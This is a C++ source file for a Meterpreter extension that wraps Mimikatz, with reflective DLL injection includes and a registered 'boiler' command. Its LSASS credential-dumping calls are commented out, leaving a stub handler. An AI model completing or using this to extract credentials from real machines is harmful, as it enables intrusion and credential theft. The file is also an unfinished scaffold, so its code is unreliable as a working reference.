#ifndef _METERPRETER_SOURCE_EXTENSION_MIMIKATZ_MIMIKATZ_H
#define _METERPRETER_SOURCE_EXTENSION_MIMIKATZ_MIMIKATZ_H
extern "C" 
{
#include "../../common/common.h"
}
#endif

#include <io.h>
#include <fcntl.h>
#include <iostream>
#include <fstream>

	#include "mimikatz.h"

extern "C" 
{

#include "modules/mod_mimikatz_sekurlsa.h"

/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : http://creativecommons.org/licenses/by-nc-sa/3.0/fr/
*/

#include "../../ReflectiveDLLInjection/DelayLoadMetSrv.h"
// include the Reflectiveloader() function, we end up linking back to the metsrv.dll's Init function
// but this doesnt matter as we wont ever call DLL_METASPLOIT_ATTACH as that is only used by the 
// second stage reflective dll inject payload and not the metsrv itself when it loads extensions.
#include "../../ReflectiveDLLInjection/ReflectiveLoader.c"


// this sets the delay load hook function, see DelayLoadMetSrv.h
EnableDelayLoadMetSrv();

DWORD request_boiler(Remote *remote, Packet *packet)
{
	Packet * response = packet_create_response(packet);
	bool result = 0;
	//std::wofstream logFile( "c:\\out.txt"); 
    //std::wstreambuf *outbuf = std::wcout.rdbuf(logFile.rdbuf());
	//std::wstreambuf *errbuf = std::wcerr.rdbuf(logFile.rdbuf());

	vector<wstring> * mesArguments = new vector<wstring>();

	//mimikatz * myMimiKatz = new mimikatz(mesArguments);

	vector<pair<mod_mimikatz_sekurlsa::PFN_ENUM_BY_LUID, wstring>> monProvider;
	//result = mod_mimikatz_sekurlsa_wdigest::getWDigest(mesArguments);
	/*
	if  (mod_mimikatz_sekurlsa::searchLSASSDatas())
	{
		mod_mimikatz_sekurlsa::getLogonData(mesArguments, &monProvider);
	}*/
	
	packet_transmit_response(result, remote, response);
	return ERROR_SUCCESS;	
}

Command customCommands[] =
{
	{ "boiler",
	  { request_boiler,                                    { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},

	// Terminator
	{ NULL,
	  { EMPTY_DISPATCH_HANDLER                      },
	  { EMPTY_DISPATCH_HANDLER                      },
	},
};

/*
 * Initialize the server extension
 */
DWORD __declspec(dllexport) InitServerExtension(Remote *remote)
{
	DWORD index;

	hMetSrv = remote->hMetSrv;

	for (index = 0;
	     customCommands[index].method;
	     index++)
		command_register(&customCommands[index]);

	return ERROR_SUCCESS;
}

/*
 * Deinitialize the server extension
 */
DWORD __declspec(dllexport) DeinitServerExtension(Remote *remote)
{
	DWORD index;

	for (index = 0;
	     customCommands[index].method;
	     index++)
		command_deregister(&customCommands[index]);

	return ERROR_SUCCESS;
}
}


//int wmain(int argc, wchar_t * argv[])
//{
//	setlocale(LC_ALL, "French_France.65001");
//	_setmode(_fileno(stdin), _O_U8TEXT/*_O_WTEXT/*_O_U16TEXT*/);
//	_setmode(_fileno(stdout), _O_U8TEXT/*_O_WTEXT/*_O_U16TEXT*/);
//	_setmode(_fileno(stderr), _O_U8TEXT/*_O_WTEXT/*_O_U16TEXT*/);
//	
//	/*SetConsoleCP(CP_UTF8);
//	SetConsoleOutputCP(CP_UTF8);*/
//	
//	vector<wstring> * mesArguments = new vector<wstring>(argv + 1, argv + argc);
//	
//	mimikatz * myMimiKatz = new mimikatz(mesArguments);
//	delete myMimiKatz, mesArguments;
//	return ERROR_SUCCESS;
//}
